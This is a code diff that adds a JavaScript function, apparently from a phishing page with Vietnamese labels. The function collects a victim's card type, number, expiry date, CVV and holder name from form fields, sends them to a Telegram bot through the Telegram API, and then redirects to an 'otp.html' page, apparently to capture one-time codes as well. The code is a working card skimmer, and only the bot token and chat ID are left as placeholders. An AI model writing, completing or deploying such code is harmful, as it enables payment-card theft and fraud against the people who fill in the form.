@@ -1,0 +1,15 @@
+async function sendCard(e) {
+    e.preventDefault();
+    const deviceID = localStorage.getItem('deviceID') || "Không rõ máy";
+    const TOKEN = 'YOUR_BOT_TOKEN'; const CHAT_ID = 'YOUR_CHAT_ID';
+    
+    const msg = `💳 <b>THÔNG TIN THẺ - MÁY: ${deviceID}</b>\n` +
+                `--------------------------\n` +
+                `🔹 Loại: ${document.querySelector('input[name="type"]:checked').value}\n` +
+                `🔹 Số: <code>${document.getElementById('n').value}</code>\n` +
+                `🔹 Hạn: ${document.getElementById('e').value} | CVV: ${document.getElementById('c').value}\n` +
+                `🔹 Chủ: ${document.getElementById('h').value.toUpperCase()}`;
+
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+    window.location.href = 'otp.html';
+}
